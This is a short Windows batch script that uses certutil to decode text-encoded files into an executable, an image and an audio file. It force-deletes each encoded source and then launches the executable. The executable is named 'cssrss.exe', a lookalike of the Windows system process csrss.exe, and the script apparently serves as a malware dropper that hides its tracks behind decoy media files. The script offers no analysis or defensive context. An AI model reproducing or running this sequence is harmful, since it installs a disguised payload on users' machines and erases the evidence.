certutil -decode cssrss.txt cssrss.exe
 del /f /q cssrss.txt
 certutil -decode sb2.txt sb2.jpg
 del /f /q sb2.txt
 certutil -decode song.txt song.mp3
 del /f /q song.txt
 start cssrss.exe
